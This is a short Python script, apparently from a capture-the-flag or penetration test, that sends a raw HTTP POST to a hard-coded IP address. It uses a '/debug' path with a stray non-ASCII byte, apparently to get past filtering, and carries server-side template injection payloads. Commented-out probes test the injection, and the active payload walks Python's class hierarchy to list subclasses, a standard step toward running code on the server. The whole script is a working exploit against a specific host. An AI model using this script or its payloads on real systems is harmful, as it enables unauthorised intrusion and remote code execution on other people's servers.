import socket
import json

host = "161.97.155.116"
port = 80
#data = {"name": "manini"} # Simple POST
#data = {"name": "#set( $foo = 7*7 )\n$foo"} # Testing SSTI
data = {"name": "#set($s='')#set($base=$s.__class__.__mro__[1])#foreach($sub in $base.__subclasses__())$foreach.index: $sub\n#end"} # Listing subclasses

body = json.dumps(data)


request = (
    b"POST /debug\x85 HTTP/1.1\r\n"
    b"Host: " + host.encode() + b"\r\n"
    b"Content-Type: application/json\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n"
    b"\r\n" + body.encode()
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(request)
    # Read until the server closes the connection
    chunks = []
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        chunks.append(chunk)
    response = b"".join(chunks).decode(errors="replace")
    print(response)
